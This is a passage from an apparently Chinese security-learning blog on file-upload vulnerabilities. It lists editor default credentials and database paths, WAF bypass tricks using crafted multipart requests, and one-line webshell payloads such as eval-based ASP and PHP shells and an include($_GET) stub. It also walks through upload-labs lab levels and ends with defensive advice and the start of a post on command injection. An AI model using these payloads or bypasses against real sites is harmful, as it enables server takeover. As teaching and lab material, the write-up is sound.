在form中的action=&quot;http://22.22.22.22/fckeditor/editor/filemanager/upload/php/upload.php?Type=Media&quot; 即可，然后上传</code></pre><h5 id="2-eWebEditor"><a href="#2-eWebEditor" class="headerlink" title="2 eWebEditor"></a>2 eWebEditor</h5><pre><code>1、默认后台
    2.80以前为：ewebeditor/admin_login.asp
    2.80以后为：admin/login.asp
2、默认账号密码
    admin   admin888
3、数据库地址
    默认数据库地址
    ewebeditor/db/ewebeditor.mdb
    常用数据库地址
    ewebeditor/db/ewebeditor.asa
    ewebeditor/db/ewebeditor.asa
    ewebeditor/db/#ewebeditor.asa
    ewebeditor/db/#ewebeditor.mdb
    ewebeditor/db/!@#ewebeditor.asp
    ewebeditor/db/ewebeditor1033.mdb
    asp asa为后缀的数据库下载下来后改为mdb</code></pre><h4 id="针对各种WAF"><a href="#针对各种WAF" class="headerlink" title="针对各种WAF"></a>针对各种WAF</h4><h5 id="1-垃圾数据"><a href="#1-垃圾数据" class="headerlink" title="1 垃圾数据"></a>1 垃圾数据</h5><p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p>
<p><img src="https://images.seebug.org/content/images/2018/04/a7ae783e-9275-4e41-9c70-c899396fb012.png-w331s" alt="img"></p>
<p>当然也可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/cd2f1355-be07-4c63-a802-0aa991bf2197.png-w331s" alt="img"></p>
<p>可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
<h5 id="2-filename"><a href="#2-filename" class="headerlink" title="2 filename"></a>2 filename</h5><p>针对早期版本安全狗，可以多加一个filename</p>
<p><img src="https://images.seebug.org/content/images/2018/04/0bd2ce6f-25e0-4f59-b004-957ff71b1fd9.png-w331s" alt="img"></p>
<p>或者将filename换位置，在IIS6.0下如果我们换一种书写方式，把filename放在其他地方：</p>
<p><img src="https://images.seebug.org/content/images/2018/04/d86eaa81-9a84-40dc-9347-6c5bfdbfeaf6.png-w331s" alt="img"></p>
<h5 id="3-POST-GET"><a href="#3-POST-GET" class="headerlink" title="3 POST/GET"></a>3 POST/GET</h5><p>有些WAF的规则是：如果数据包为POST类型，则校验数据包内容。 此种情况可以上传一个POST型的数据包，抓包将POST改为GET。</p>
<h5 id="4-以上方式"><a href="#4-以上方式" class="headerlink" title="4 以上方式"></a>4 以上方式</h5><p>针对WAF，以上介绍的服务器解析漏洞、文件包含漏洞等都可以尝试绕过。</p>
<p>**</p>
<h5 id="5-利用waf本身缺陷"><a href="#5-利用waf本身缺陷" class="headerlink" title="5 利用waf本身缺陷"></a>5 利用waf本身缺陷</h5><h6 id="删除实体里面的Conten-Type字段"><a href="#删除实体里面的Conten-Type字段" class="headerlink" title="删除实体里面的Conten-Type字段"></a>删除实体里面的Conten-Type字段</h6><p><img src="https://images.seebug.org/content/images/2018/04/f7b360e4-e055-43b7-ae94-b98419256476.png-w331s" alt="img"></p>
<p>第一种是删除Content整行，第二种是删除C后面的字符。删除掉ontent-Type: image/jpeg只留下c，将.php加c后面即可，但是要注意额，双引号要跟着c.php。</p>
<pre class=" language-html"><code class="language-html">正常包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png"Content-Type: image/png
构造包：Content-Disposition: form-data; name="image"; filename="085733uykwusqcs8vw8wky.png
C.php"</code></pre>
<h6 id="删除Content-Disposition字段里的空格"><a href="#删除Content-Disposition字段里的空格" class="headerlink" title="删除Content-Disposition字段里的空格"></a>删除Content-Disposition字段里的空格</h6><p><img src="https://images.seebug.org/content/images/2018/04/1ca10020-3739-4def-b0e1-f4b004a1f196.png-w331s" alt="img"></p>
<p>增加一个空格导致安全狗被绕过案列： Content-Type: multipart/form-data; boundary=—————————4714631421141173021852555099 尝试在boundary后面加个空格或者其他可被正常处理的字符： boundary= —————————47146314211411730218525550</p>
<h6 id="修改Content-Disposition字段值的大小写"><a href="#修改Content-Disposition字段值的大小写" class="headerlink" title="修改Content-Disposition字段值的大小写"></a>修改Content-Disposition字段值的大小写</h6><p><img src="https://images.seebug.org/content/images/2018/04/ae0437ec-b9f5-48db-a28f-75408445c23f.png-w331s" alt="img"></p>
<h6 id="Boundary边界不一致"><a href="#Boundary边界不一致" class="headerlink" title="Boundary边界不一致"></a>Boundary边界不一致</h6><p>每次文件上传时的Boundary边界都是一致的：</p>
<pre><code>Content-Type: multipart/form-data; boundary=---------------------------4714631421141173021852555099
Content-Length: 253
-----------------------------4714631421141173021852555099
Content-Disposition: form-data; name=&quot;file1&quot;; filename=&quot;shell.asp&quot;
Content-Type: application/octet-stream

&lt;%eval request(&quot;a&quot;)%&gt;
-----------------------------4714631421141173021852555099--</code></pre><p>但如果容器在处理的过程中并没有严格要求一致的话可能会导致一个问题，两段Boundary不一致使得waf认为这段数据是无意义的，可是容器并没有那么严谨： Win2k3 + IIS6.0 + ASP</p>
<p><img src="https://images.seebug.org/content/images/2018/04/c4f02267-e336-41c1-9423-3c86fa81856b.png-w331s" alt="img"></p>
<h6 id="文件名处回车"><a href="#文件名处回车" class="headerlink" title="文件名处回车"></a>文件名处回车</h6><p><img src="https://images.seebug.org/content/images/2018/04/80c9d74a-d9bc-411c-af2a-a704eb5e1aff.png-w331s" alt="img"></p>
<h6 id="多个Content-Disposition"><a href="#多个Content-Disposition" class="headerlink" title="多个Content-Disposition"></a>多个Content-Disposition</h6><p>在IIS的环境下，上传文件时如果存在多个Content-Disposition的话，IIS会取第一个Content-Disposition中的值作为接收参数，而如果waf只是取最后一个的话便会被绕过，Win2k8 + IIS7.0 + PHP</p>
<p><img src="https://images.seebug.org/content/images/2018/04/6b945737-c4b4-4350-a5ba-972b35b09fda.png-w331s" alt="img"></p>
<h5 id="利用NTFS-ADS特性"><a href="#利用NTFS-ADS特性" class="headerlink" title="利用NTFS ADS特性"></a>利用NTFS ADS特性</h5><p>ADS是NTFS磁盘格式的一个特性，用于NTFS交换数据流。在上传文件时，如果waf对请求正文的filename匹配不当的话可能会导致绕过。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/b3625731-9f1d-4889-8609-b357b61a2368.png-w331s" alt="img"></p>
<h5 id="文件重命名绕过"><a href="#文件重命名绕过" class="headerlink" title="文件重命名绕过"></a>文件重命名绕过</h5><p>如果web程序会将filename除了扩展名的那段重命名的话，那么还可以构造更多的点、符号等等。</p>
<p><img src="https://images.seebug.org/content/images/2018/04/95eabfd7-54b0-4f0f-971f-2316423fac33.png-w331s" alt="img"></p>
<h5 id="特殊的长文件名绕过"><a href="#特殊的长文件名绕过" class="headerlink" title="特殊的长文件名绕过"></a>特殊的长文件名绕过</h5><p>文件名使用非字母数字，比如中文等最大程度的拉长，不行的话再结合一下其他的特性进行测试：</p>
<p>shell.asp;王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王王.jpg</p>
<h5 id="反删除"><a href="#反删除" class="headerlink" title="反删除"></a>反删除</h5><p>将下图file1改成了file4，这样就不会把这个文件删除了。（JCMS漏洞）</p>
<p><img src="https://images.seebug.org/content/images/2018/04/389b0352-5ba1-4d7c-8d77-198dab060856.png-w331s" alt="img"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><pre class=" language-html"><code class="language-html">条件： 寻找一个上传点，查看上传点是否可用。

利用：

首先判断是程序员自己写的上传点，还是编辑器的上传功能

如果是编辑器上传功能，goolge当前编辑器的漏洞

如果是程序员写的上传点

上传一个正常的jpg图片 查看上传点是否可用

上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）

上传一个正常的jpg图片，burp拦截， 00截断 1.php%00.jpg

判断服务器是什么类型，web服务器程序，是什么类型，版本号多少

利用解析漏洞</code></pre>
<h4 id="防护建议"><a href="#防护建议" class="headerlink" title="防护建议"></a>防护建议</h4><ol>
<li>使用白名单限制可以上传的文件扩展（白名单比黑名单可靠多了）</li>
<li>验证文件内容，使用正则匹配恶意代码限制上传</li>
<li>对上传后的文件统一随机命名，不允许用户控制扩展名</li>
<li>修复服务器可能存在的解析漏洞</li>
<li>严格限制可以修改服务器配置的文件上传如：.htaccess</li>
<li>隐藏上传文件路径。</li>
<li>升级Web Server</li>
<li>及时修复Web上传代码（重要）</li>
<li>不能有本地文件包含漏洞</li>
<li>注意0x00截断攻击（PHP更新到最新版本）</li>
<li>上传文件的存储目录禁用执行权限</li>
</ol>
<h3 id="文件上传漏洞的主要利用和绕过方式总结。"><a href="#文件上传漏洞的主要利用和绕过方式总结。" class="headerlink" title="文件上传漏洞的主要利用和绕过方式总结。"></a>文件上传漏洞的主要利用和绕过方式总结。</h3><p><strong>1.前端JS绕过</strong></p>
<p>基于本地验证文件是否符合要求：直接将<strong>JavaScript</strong>禁用。或者burp抓包后修改后缀，将php文件后缀现先改为jpg，burp抓包后后缀改回php。</p>
<p><strong>2.MIME 类型验证</strong></p>
<p>burp抓包将<strong>Content-type</strong>类型修改为image/jpeg，image/png等</p>
<p><strong>3.黑名单验证</strong></p>
<p>1.寻找没有过滤的类型：phtml php3 php4 php5  PHP phtml</p>
<p>2.大小写绕过：例如Php</p>
<p><strong>4.文件内容验证</strong></p>
<p>1<strong>.getimagesize()函数获取图像信息</strong>：通过构造图片马进行绕过。</p>
<p>2.<strong>文件头绕过</strong>：例如 GIF89a <?php phpinfo(); ?></p>
<p>2.<strong>检验关键字</strong>&lt;?php:利用script标签绕过：<code>&lt;script language=&quot;php&quot;&gt;eval($_POST[&#39;hack&#39;]);&lt;/script&gt;</code></p>
<p><strong>6. .htaccess上传</strong></p>
<p>上传的.jpg文件都会以php格式解析</p>
<p>.htaccess内容</p>
<pre><code>AddType   application/x-httpd-php     .jpg</code></pre><p>这里代码的意思可以让 .jpg后缀名文件格式的文件名以php格式解析，因此达到了可执行的效果。所以我们可以把要上传的php文件的后缀名改为.jpg格式从而绕过</p>
<p><strong>7.00截断绕过</strong></p>
<p>php.   jpg  将空格二进制20改为00；</p>
<p><strong>8.win系统解析漏洞绕过</strong></p>
<p>1.上传1.php(或者图片马)，抓包修改为1.php.</p>
<p>2.上传1.php(或者图片马)，抓包修改为1.php::$DATA</p>
<p>3.上传1.php(或者图片马)，抓包修改为1.php:1.jpg</p>
<p>4.上传1.php(或者图片马)，抓包修改为1.php::$DATA…….</p>
<p><strong>9.文件包含绕过</strong>：首先上传图片木马shell.jpg，然后上传可以进行文件包含的php文件,比如上传1.php</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$x</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>然后我们访问1.php?x=shell.jpg即可。</p>
<p><strong>10.条件竞争绕过</strong></p>
<p>通过BURP不断发包，导致不断写入webshell,再写入速度频率上超过安全软件查杀频率，导致绕过。</p>
<p><strong>11.二次渲染绕过</strong></p>
<p>上传图片加载后，会对图片进行二次渲养，改变大部分图片源码，绕过为：对照上传后的图片与原图片放在winhex中对不，查看图片哪个数据块没有被改变。将木马代码放在没有改变的一块中，在不损坏图片的前提下，即可绕过上传</p>
<p><strong>12.中间件解析漏洞</strong></p>
<p>apache：上传图片马，抓包修改为1.php.xxxx.abc</p>
<p>iis6.0 6.5：上传图片马，抓包修改猴嘴为.asa、.cer和.cdx等。</p>
<p>​                    上传图片马，抓包修改为1.asp;.jpg或者%00 /00也可以</p>
<p>​                    上传图片马，抓包发现有保存图片的路径，如../upload/image</p>
<p>nginx: 上传图片马，拿到图片马的路径，访问的时候加上/.php 就可作为php文件解析,如         </p>
<p>​            upload/image/1.jpg/.php</p>
<p>tomcat:弱口令进入后台，上传war包即可，shell.jsp–&gt;shell.zip–&gt;shell.war</p>
<h3 id="靶场：upload-labs-实战总结"><a href="#靶场：upload-labs-实战总结" class="headerlink" title="靶场：upload-labs 实战总结"></a>靶场：upload-labs 实战总结</h3><p><strong>upolad-labs考察知识点汇总：</strong></p>
<img src="11525934-e19630249b9b8764.png"  />



<p>​    upload-labs是一个使用php语言编写的，专门收集渗透测试和CTF中遇到的各种上传漏洞的靶场。旨在帮助大家对上传漏洞有一个全面的了解。目前一共20关，每一关都包含着不同上传方式。</p>
<h5 id="Pass-01-前端js检测"><a href="#Pass-01-前端js检测" class="headerlink" title="Pass-01-前端js检测"></a>Pass-01-前端js检测</h5><p><strong>考察知识点：</strong>前端js检测，我们可以选择禁用js,或者直接burp直接抓包绕过.。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201219.png" alt=""></p>
<h5 id="Pass-02-只检测Content-type"><a href="#Pass-02-只检测Content-type" class="headerlink" title="Pass-02 只检测Content-type"></a>Pass-02 只检测Content-type</h5><p><strong>考察知识点：</strong>Content-Type绕过，我们直接改为 image/jpeg</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115201548.png" alt=""></p>
<h5 id="Pass-03-黑名单绕过"><a href="#Pass-03-黑名单绕过" class="headerlink" title="Pass-03 黑名单绕过"></a>Pass-03 黑名单绕过</h5><p><strong>考察知识点：</strong>黑名单绕过，禁止上传.asp|.aspx|.php|.jsp后缀文件，但是我们可以上传.php3 .phtml .php5另类后缀名。</p>
<h5 id="Pass-04-htaccess绕过"><a href="#Pass-04-htaccess绕过" class="headerlink" title="Pass-04  .htaccess绕过"></a>Pass-04  .htaccess绕过</h5><p><strong>考察知识点：</strong>构造.htaccess文件，内容为<code>AddType  application/x-httpd-php  .jpg</code></p>
<p>我们首先上传.htaccess文件，</p>
<img src="QQ截图20200124121848.png" style="zoom: 80%;" />



<p>然后上传我们事先准备好的php文件将后缀改为.jpg文件,</p>
<img src="QQ截图20200124122245.png" style="zoom:150%;" />

<p>可以在本地看到成功上传。</p>
<h5 id="Pass-05-大小写绕过"><a href="#Pass-05-大小写绕过" class="headerlink" title="Pass-05 大小写绕过"></a>Pass-05 大小写绕过</h5><p><strong>考察知识点：</strong>因为此次黑名单过滤了.htaccess，但是没有将文件名转换为小写。所以我们可以通过大小写绕过。</p>
<img src="QQ截图20200124124135.png" style="zoom: 80%;" />



<h5 id="Pass-06-空格绕过"><a href="#Pass-06-空格绕过" class="headerlink" title="Pass-06 空格绕过"></a>Pass-06 空格绕过</h5><p><strong>考察知识点</strong>：修改文件后缀为<code>1.php空格</code>.,利用.php[空格]绕过黑名单，然后利用windows的文件命名规则默认除去空格,达到上传.php的目的</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200124124135.png" alt=""></p>
<h5 id="Pass-07-点绕过"><a href="#Pass-07-点绕过" class="headerlink" title="Pass-07 点绕过"></a>Pass-07 点绕过</h5><p><strong>考察知识点：</strong>wIndow命名规则:window下 xx.php空格xx.php.不允许存在，系统会默认去除空格或点。此处过滤了空格，但是没有过滤点。我们用burp将文件后缀改为php.即可。</p>
<img src="QQ截图20200124130943.png" style="zoom:150%;" />



<h5 id="Pass-08-DATA绕过"><a href="#Pass-08-DATA绕过" class="headerlink" title="Pass-08  ::$DATA绕过"></a>Pass-08  ::$DATA绕过</h5><p><strong>考察知识点</strong>：$DATA绕过：在php+windows的情况下：如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理,不会检测后缀名.且保持”::$DATA”之前的文件名。</p>
<p>所以：文件后缀改为：<code>xx.php::$DATA</code>即可</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115202909.png" alt=""></p>
<h5 id="Pass-09-点空格点绕过"><a href="#Pass-09-点空格点绕过" class="headerlink" title="Pass-09 点空格点绕过"></a>Pass-09 点空格点绕过</h5><p>这里我们分析一下源代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">UPLOAD_PATH</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$deny_ext</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">".php"</span><span class="token punctuation">,</span><span class="token string">".php5"</span><span class="token punctuation">,</span><span class="token string">".php4"</span><span class="token punctuation">,</span><span class="token string">".php3"</span><span class="token punctuation">,</span><span class="token string">".php2"</span><span class="token punctuation">,</span><span class="token string">".html"</span><span class="token punctuation">,</span><span class="token string">".htm"</span><span class="token punctuation">,</span><span class="token string">".phtml"</span><span class="token punctuation">,</span><span class="token string">".pht"</span><span class="token punctuation">,</span><span class="token string">".pHp"</span><span class="token punctuation">,</span><span class="token string">".pHp5"</span><span class="token punctuation">,</span><span class="token string">".pHp4"</span><span class="token punctuation">,</span><span class="token string">".pHp3"</span><span class="token punctuation">,</span><span class="token string">".pHp2"</span><span class="token punctuation">,</span><span class="token string">".Html"</span><span class="token punctuation">,</span><span class="token string">".Htm"</span><span class="token punctuation">,</span><span class="token string">".pHtml"</span><span class="token punctuation">,</span><span class="token string">".jsp"</span><span class="token punctuation">,</span><span class="token string">".jspa"</span><span class="token punctuation">,</span><span class="token string">".jspx"</span><span class="token punctuation">,</span><span class="token string">".jsw"</span><span class="token punctuation">,</span><span class="token string">".jsv"</span><span class="token punctuation">,</span><span class="token string">".jspf"</span><span class="token punctuation">,</span><span class="token string">".jtml"</span><span class="token punctuation">,</span><span class="token string">".jSp"</span><span class="token punctuation">,</span><span class="token string">".jSpx"</span><span class="token punctuation">,</span><span class="token string">".jSpa"</span><span class="token punctuation">,</span><span class="token string">".jSw"</span><span class="token punctuation">,</span><span class="token string">".jSv"</span><span class="token punctuation">,</span><span class="token string">".jSpf"</span><span class="token punctuation">,</span><span class="token string">".jHtml"</span><span class="token punctuation">,</span><span class="token string">".asp"</span><span class="token punctuation">,</span><span class="token string">".aspx"</span><span class="token punctuation">,</span><span class="token string">".asa"</span><span class="token punctuation">,</span><span class="token string">".asax"</span><span class="token punctuation">,</span><span class="token string">".ascx"</span><span class="token punctuation">,</span><span class="token string">".ashx"</span><span class="token punctuation">,</span><span class="token string">".asmx"</span><span class="token punctuation">,</span><span class="token string">".cer"</span><span class="token punctuation">,</span><span class="token string">".aSp"</span><span class="token punctuation">,</span><span class="token string">".aSpx"</span><span class="token punctuation">,</span><span class="token string">".aSa"</span><span class="token punctuation">,</span><span class="token string">".aSax"</span><span class="token punctuation">,</span><span class="token string">".aScx"</span><span class="token punctuation">,</span><span class="token string">".aShx"</span><span class="token punctuation">,</span><span class="token string">".aSmx"</span><span class="token punctuation">,</span><span class="token string">".cEr"</span><span class="token punctuation">,</span><span class="token string">".sWf"</span><span class="token punctuation">,</span><span class="token string">".swf"</span><span class="token punctuation">,</span><span class="token string">".htaccess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_name</span> <span class="token operator">=</span> <span class="token function">deldot</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//删除文件名末尾的点</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token variable">$file_name</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//转换为小写</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token string">'::$DATA'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//去除字符串::$DATA</span>
        <span class="token variable">$file_ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//首尾去空</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file_ext</span><span class="token punctuation">,</span> <span class="token variable">$deny_ext</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$temp_file</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'upload_file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token variable">$img_path</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span><span class="token punctuation">.</span><span class="token string">'/'</span><span class="token punctuation">.</span><span class="token variable">$file_name</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$temp_file</span><span class="token punctuation">,</span> <span class="token variable">$img_path</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token variable">$is_upload</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'上传出错！'</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token string">'此文件类型不允许上传！'</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token variable">$msg</span> <span class="token operator">=</span> <span class="token constant">UPLOAD_PATH</span> <span class="token punctuation">.</span> <span class="token string">'文件夹不存在,请手工创建！'</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>这里其实已经过滤的很严格了。</p>
<p>依次进行了严格的黑名单过滤、转换大小写、去除文件名尾的空格和点。还去除了;$DATA.</p>
<p>但是这里存在很明显的代码逻辑漏洞：代码<strong>去点，除空</strong>的操作只进行了一次。那么我们把后缀名改为</p>
<p><strong>php. .</strong> 点 空格点的格式。最后的后缀名为<strong>.php.</strong> 成功绕过。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115204443.png" alt=""></p>
<h5 id="Pass-10-双写绕过"><a href="#Pass-10-双写绕过" class="headerlink" title="Pass-10 双写绕过"></a>Pass-10 双写绕过</h5><p>考察知识点:双写绕过，这里利用了<code>str_irepalce</code>函数将不符合上传的后缀名替换为空，且该函数对 大小写不敏感，我们可以通过双写后缀名 .pphphp进行绕过。</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115205208.png" alt=""></p>
<h5 id="Pass-11-get-00截断"><a href="#Pass-11-get-00截断" class="headerlink" title="Pass-11 get 00截断"></a>Pass-11 get 00截断</h5><p>考察知识点：00截断</p>
<img src="QQ截图20200124131542.png" style="zoom:50%;" />

<p><strong>Pass-12 Post 00截断</strong></p>
<p>考察知识点：00截断</p>
<p>和十一关不同的是这次的save_path是通过post传进来的，还是利用00截断，但这次需要在二进制中进行修改，因为post不会像get对%00进行自动解码</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128202954.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200128203026.png" alt=""></p>
<h4 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h4><p>考察知识点：图片马，结合文件包含</p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211730.png" alt=""></p>
<p><img src="QQ%E6%88%AA%E5%9B%BE20200115211949.png" alt=""></p>
<h5 id="拓展资料"><a href="#拓展资料" class="headerlink" title="拓展资料"></a>拓展资料</h5><ul>
<li><a href="http://thief.one/2016/09/21/服务器解析漏洞/" target="_blank" rel="noopener">http://thief.one/2016/09/21/服务器解析漏洞/</a></li>
</ul>
<h5 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h5><ul>
<li><a href="http://www.y-hkl.top/2017/09/16/文件上传漏洞解析及绕过姿势/" target="_blank" rel="noopener">文件上传漏洞解析及绕过姿势</a></li>
<li><a href="http://www.cnblogs.com/stevenwuzheng/p/5354236.html" target="_blank" rel="noopener">http://www.cnblogs.com/stevenwuzheng/p/5354236.html</a></li>
<li><a href="https://blog.csdn.net/weiwangchao_/article/details/46686505" target="_blank" rel="noopener">https://blog.csdn.net/weiwangchao_/article/details/46686505</a></li>
<li><a href="http://www.myh0st.cn/index.php/archives/7/" target="_blank" rel="noopener">http://www.myh0st.cn/index.php/archives/7/</a></li>
<li><a href="http://rdc.hundsun.com/portal/article/627.html" target="_blank" rel="noopener">http://rdc.hundsun.com/portal/article/627.html</a></li>
<li><a href="http://jdrops.dropsec.xyz/2017/07/17/文件上传漏洞总结/" target="_blank" rel="noopener">文件上传漏洞总结</a></li>
<li><a href="https://thief.one/2016/09/22/上传木马姿势汇总-欢迎补充/" target="_blank" rel="noopener">文件上传漏洞（绕过姿势）</a></li>
<li><a href="http://wyb0.com/posts/file-upload-editor-upload-vulnerability/" target="_blank" rel="noopener">http://wyb0.com/posts/file-upload-editor-upload-vulnerability/</a></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://shu1l.github.io/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Shu1L">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/03/ming-ling-zhi-xing-dai-ma-zhi-xing-lou-dong-xue-xi/" itemprop="url">命令执行/代码执行漏洞学习</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-03T16:48:40+08:00">
                2020-04-03
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index">
                    <span itemprop="name">web漏洞学习</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h2 id="代码执行-命令执行漏洞学习笔记-靶场实战"><a href="#代码执行-命令执行漏洞学习笔记-靶场实战" class="headerlink" title="代码执行+命令执行漏洞学习笔记+靶场实战"></a>代码执行+命令执行漏洞学习笔记+靶场实战</h2><p>[TOC]</p>
<h3 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h3><h4 id="一、什么是命令执行漏洞"><a href="#一、什么是命令执行漏洞" class="headerlink" title="一、什么是命令执行漏洞"></a>一、什么是命令执行漏洞</h4><h5 id="命令执行漏洞概念："><a href="#命令执行漏洞概念：" class="headerlink" title="命令执行漏洞概念："></a>命令执行漏洞概念：</h5><p>当应用需要调用一些外部程序去处理内容的情况下，就会用到一些执行系统命令的函数。如PHP中的system，exec，shell_exec等，当用户可以控制命令执行函数中的参数时，将可注入恶意系统命令到正常命令中，造成命令执行攻击。</p>
<h5 id="漏洞危害："><a href="#漏洞危害：" class="headerlink" title="漏洞危害："></a>漏洞危害：</h5><ul>
<li>继承web服务器程序的权限，去执行系统命令。</li>
<li>继承web服务器程序的权限，读取文件</li>
<li>反弹shell</li>
<li>控制整个网站甚至控制整个服务器</li>
</ul>
